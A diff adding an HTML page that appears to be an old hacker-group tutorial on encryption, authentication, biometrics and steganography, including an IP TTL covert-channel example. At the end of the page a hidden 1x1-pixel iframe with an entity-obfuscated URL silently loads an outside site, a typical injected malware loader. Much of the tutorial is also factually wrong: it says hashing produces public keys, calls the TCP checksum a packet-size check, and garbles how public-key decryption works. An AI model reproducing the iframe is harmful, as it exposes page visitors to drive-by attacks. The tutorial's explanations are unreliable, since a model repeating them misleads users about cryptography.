@@ -1,0 +1,371 @@
+
+<HTML><HEAD><TITLE>Black Sun Research Facility Tutorials - Encryption and Authentication</TITLE>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<STYLE type=text/css>A:active {
+	TEXT-DECORATION: none
+}
+A:hover {
+	COLOR: #ffffff; TEXT-DECORATION: none
+}
+A:link {
+	TEXT-DECORATION: none
+}
+A:visited {
+	TEXT-DECORATION: none
+}
+.small {
+	FONT-WEIGHT: bold; FONT-SIZE: 9pt; COLOR: #ffffff; FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif
+}
+.small_uppercase {
+	FONT-SIZE: 9pt; COLOR: #999999; FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif
+}
+TD {
+	FONT-SIZE: 9pt; COLOR: #aeaeae; FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif
+}
+.7_ver_b_white {
+	FONT-WEIGHT: bold; FONT-SIZE: 8pt; COLOR: #ffffff; FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif
+}
+
+.white {
+	FONT-WEIGHT: bold; FONT-SIZE: 8pt; COLOR: #ffffff; FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif
+}
+</STYLE>
+
+<META content="MSHTML 6.00.2600.0" name=GENERATOR></HEAD>
+<BODY text=#a7a7a7 vLink=#ff9900 aLink=#ffcc00 link=#ff9900 bgColor=#000000 
+leftMargin=0 topMargin=0 marginheight="0" marginwidth="0">
+<BR><BR><PRE><FONT color=red>
+              _________________
+             /_               /\  
+              \/  _______    /  \
+              /  /      /   /   /
+             /  /______/   /   /
+            /           __/   /
+           /  _______   \  __/
+          /  /      /   /  \
+         /  /______/   /   / 
+       _/             /   /      
+      /______________/   /       BLACK SUN RESEARCH FACILITY
+      \              \  /      	   <A href="http://blacksun.box.sk/">http://blacksun.box.sk/</A>
+       \______________\/
+
+
+</FONT>
+
+
+ENCRYPTION AND AUTHENTICATION
+=================================================
+
+
+
+   WRITTEN BY                 [ <A href="mailto:cos125@hotmail.com">cos125@hotmail.com</A>                :E-MAIL    ]      
+           <A href="mailto:cos125@hotmail.com">BINARY RAPE</A>        [ 114603188                         :ICQ#      ]      
+                              [ <A href="http://blacksun.box.sk/">http://blacksun.box.sk/</A>           :TURORIALS ]      
+
+
+
+
+
+CONTENTS
+=======================================
+
+1.  Introduction.
+2.  Key Systems.
+
+    2.1 Symmetric Key
+    2.2 Public Key
+
+3.  Digital Certificates.
+4.  Hash Algorithms.
+5.  Authentication.
+   
+    5.1 Usernames and Passwords
+    5.2 Passcards
+    5.3 Digital Signatures
+    5.4 Checksum
+
+6.  Biometrics.
+7.  Steganography.
+8.  Last Words.
+
+
+
+
+____________________________________________________________________________________________
+
+
+
+1.0 INTRODUCTION
+=======================================
+
+In recent times privacy and security has become increasingly important
+especially with newer technologies like wireless networking and the
+potential problems they represent. Encryption has always been an
+effective way to conceal information and before the digital era it was
+mostly used my governments such as the germans and americans during the
+second world war and has been seen as far back as the times of the great
+Roman Empire. There is alot of information that we would like to keep
+private like credit card and financial information and personal letters
+and conversations, encryption and the science of cryptography allows us
+to do this.
+
+
+2.0 KEY SYSTEMS
+=======================================
+
+There are two different kinds of systems used to handle encryption and
+convert data these are called Symmetric and Public key encryption.
+
+
+2.1 SYMMETRIC KEY
+=======================================
+
+Symmetric key encryption involves 2 computers on a network each with a
+"key" installed on it. This key allows each of the computers to decode
+the encrypted data that was sent to it. For example computer A is sending
+an encrypted packet to computer B for this example we will use a very
+simple kind of encryption, for every letter in the data we move down
+the alphabet 2 places A becomes C and B becomes D, using this information
+we can both encrypt and decrypt the information.
+
+Computer	 	Symmetric Key	    Computer
+========	 	============= 	    ========
+   A    --->----- Shift 2 places --->----    B
+
+Using the shift 2 places key A can send the message 'Hello' to B, Hello
+will be shifted by the key and B will recieve "Jgnnq" this just looks like
+gibberish until B looks at its key and it knows to shift the letters 2
+places, doing this B can see that it says Hello, of course this is a bit
+simplified but you can see how this method can be built upon to form
+greater, more sophisticated levels of encryption.
+
+
+2.2 PUBLIC KEY
+=======================================
+
+Public Key encryption relies upon 2 keys, the public key and the private key.
+The private key is held by your computer, when you want to send secure
+data between a computer and your own you give your public key to that person
+then every computer that wants to communicate with you has a copy of your
+public key. To decode any messages you send to those computers they must use
+a combination of both your public key and their own private key, this method
+of encryption is most popularly used with the encryption program pgp, you
+can get this software from www.pgp.com.
+
+Most computers use a mixture of symmetric and public key encryption because
+of the amount of processing that is required. When starting a secure connection
+the first computer uses a symmetric key and sends this to the second computer
+using public key encryption. The two computers then use symmetric encryption
+for the rest of the transaction. Once the session is completed the key is
+discarded and a new key must be created for all following sessions, this means
+that even if somehow a person gets your key, once the session has ended it wont
+matter and the key will be useless.
+
+
+3.0 DIGITAL CERTIFICATES
+=======================================
+
+Public Key encryption wouldn't be practical to use for applications such as
+web servers for online transactions, for this purpose Digital Certificates
+were developed. The digital certificate is a small file provided to each
+computer by an independent system called a certification body, this tells
+each computer that the other one is who it says it is and that it can be
+trusted, the certification body then sends the public keys of each computer
+to the other and they are free to communicate.
+
+The digital cert method is mostly used in SSL (Secure Sockets Layer). SSL
+was developed by netscape and quickly adopted for browser to web server
+communication, especially by sites dealing in e-commerce and financial trans-
+actions such as amazon.com or dabs.com.
+
+SSL is a part of larger security protocol called TLS (Transport Layer Security)
+which has a large backing from microsoft. In your web browser there is 2 tell
+tale signs that such precautions are in place, the first is the small pad-lock
+that appears in your status bar if it appears to be locked the site is secure,
+otherwise there is no security between your connection, another sign is the
+address in the bar at the top, if you had a secure transaction in place with
+blacksun's site your address bar would read https://blacksun.box.sk instead
+of the usual http:// beofore the address. You may also notice some Certificate
+or digitally signed alerts you recieve when you try to download certain software
+or access certain websites, this is just to tell you that the site *should*
+essentially be trustworthy altough the average web surfer wont have a clue what
+its talking about.
+
+
+4.0 HASH ALGORITHMS
+=======================================
+
+To get a public key we use a hash value, to get this value the computer uses
+an input value usually a large one like 12,537, then puts that number trough
+the hashing algorithm and we get an ouput, if we had a simple algorithm like
+multiply the input number by 124 we would end up with 1,554,588, it would be
+very hard to guess the original number was 12,537 unless you knew to divide
+the output by 124 to get the original number. Most Hash algorithms are much
+more sophisticated than this.
+
+Hash algorithms can be very long and use massive hash values, the level of
+encryption is measured by its hash value and this can go up to 128 bit numbers
+which would give us a hash value of anything between 2 to the power of 0 and
+2 to the power of 128, which in decimal terms is anywhere inbetween 0 and
+3,402,823,669,209,384,634,633,746,074,300,000,000,000,000,000,000,000,000,000,000,000,000.
+which would be a little more difficult :).
+
+
+5.0 AUTHENTICATION
+=======================================
+
+Another option in computer security which is often used hand in hand with
+encryption is authentication systems. There are several different commonly
+used authentication systems including the following.
+
+
+5.1 USERNAMES AND PASSWORDS
+=======================================
+
+This method has been used for many years to gaurd the personal information
+and privacy of different users on a computer system or network. This is
+the most popular method and is in place in one form or another on every
+operating system to varying degrees of success. The computer encrypts the
+password and compares it with an earlier encrypted version of the users
+password, if the two files match then the password is correct. A password
+cracker operates by encrypting a series of words and comparing them with
+the password file, once it finds a match it alerts the user of the cracking
+software with both username and password.
+
+
+5.2 PASS CARDS
+=======================================
+
+There are several types of pass cards mostly used in offices, these range
+from standard swipe cards, similiar to credit cards they have a magnetic
+strip holding the users information, to smart cards containg a small chip,
+this method is used most commonly on the macintosh where you place a small
+card into the keyboard on the left, some software such as Quark Express
+uses this method to ensure that a licence for the software has been purchased.
+
+
+5.3 DIGITAL SIGNATURES
+=======================================
+
+Digital signatures are a form of public key encryption. The signer of the
+document(e-mail, text file etc..) uses his private key and a four part
+public key to digitally sign the document, the algorithm used is the
+Digital Signature Algorithm (DSA) which is endorsed by the US government.
+If any changes occur to the contents of the document after it has been
+signed the signature is rendered invalid.
+
+
+5.4 CHECKSUM
+=======================================
+
+Checksum methods arent usually used for security purposes but can be used
+as such. TCP/IP uses a checksum technique, it gets the size of the packet
+and stores it in a field within the header, on arrival to the remote computer
+it checks the size of the packet and then compares it with the value of the
+field within the header, if the 2 dont match, the packet is discarded this
+is usually because of errors or loss during transport but this and similiar
+methods can be used to ensure data is not altered by a person.
+
+
+6.0 BIOMETRICS
+=======================================
+
+Biometrics operate on the fact that every person has a certain unique
+set of features about them and these features are then used as a basis
+of authentification to that person. Biometric authentication can use
+several features of the person including,
+
+Face scan			- Identifying a person based on the features of their face.
+Retina Scan		- Identified upon the patterns of the eyes retina.
+Fingerprints		- Identifies the person on their unique fingerprint.
+Voice Identification	- Based upon levels and pitch of voice.
+DNS Fingerprinting		- Not very common, checks the DNA structure from biological material.
+
+
+7.0 STEGANOGRAPHY
+=======================================
+
+Steganography is the process of storing information within common everyday
+material. This method is most commonly used with images such as gif or jpeg
+files however the technology has been extended to other areas such as mp3
+files or common internet traffic within the headers. There are many programs
+available across the internet for hiding information with steganogaphy.
+As an example of steganography heres an example of storing some information
+within normal web traffic:
+
+within the ip header theres a field called the ttl or Time-To-Live, which
+holds a numeric value, by storing the numerical value of an ascii characther
+we can send short messages 1 charachter at a time, the maximum value of an
+ascii characther is 255 so this value would not seem very uncommon so far as
+ttl fields in ordinary traffic. You would have to ensure the remote computer
+was on the same network so that the hop count could be predicted, move 1
+charachter up for each hop to handle the ttl being decremented. A better
+example would be to use icmp, icmp has alot of room left within its body
+as it doesnt usually carry a payload, by storing information with the payload
+of an icmp packet you could transfer information similiarly to normal traffic
+and it is uncommon for this to be checked or logged by systems, this could be
+further improved by encrypting the payload and this method is not bound by
+prolems such as calculating the hops and has much more room to transmit data,
+despite limitations heres an example of transmitting a word in ttl fields >>
+
+Packet-1
+192.62.4.1->192.62.4.2, win:512, ttl:72, id:20482
+(72 = 'H')
+
+Packet-2
+192.62.4.1->192.62.4.2, win:512, ttl:69, id:21436
+(69 = 'E')
+
+Packet-3
+192.62.4.1->192.62.4.2, win:512, ttl:76, id:22132
+(76 = 'L')
+
+Packet-4
+192.62.4.1->192.62.4.2, win:512, ttl:76, id:23019
+(76 = 'L')
+
+Packet-5
+192.62.4.1->192.62.4.2, win:512, ttl:79, id:24149
+(79 = 'O')
+
+Packet-6
+192.62.4.1->192.62.4.2, win:512, ttl:10, id:25218
+(10 = '\r\n'[Carriage return or New Line])
+
+This transfers H-E-L-L-O\r\n, which is of course the
+word hello, its terminated by a carriage return to
+track the end of each word.
+
+
+8.0 LAST WORDS
+=======================================
+
+By using a mixture of these technologies it is possible to make communiceation
+and information more secure from unwelcome eyes and ears. Thanks to these
+methods digital transmissions are more secure than other kinds like mail
+or even phone calls, especially on cellular phones, altough it pays to
+remember that nothing is truely secure, especially in the way that the
+encryption algorithms were so quickly cracked and captured using radio
+antennas on wireless networks or from programs such as john the cracker.
+
+Well thats the end of this little tutorial and i hope you learnt more about
+both encryption and authentication and their processes.
+
+
+SHOUTS
+=======================================
+
+Starman_Jones		- Thanks for everything over the years (especially for my own room).
+
+Vsus			- I am never drinking Tsambuca with you again :P.
+
+Delusive			- Nice arse luv :P.
+
+BSRF			- Thanks to every-1 at BSRF for releasing this and for being a good laugh :).
+
+ALL @ IRC.BOX.SK
+
+
+</PRE>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY></HTML>
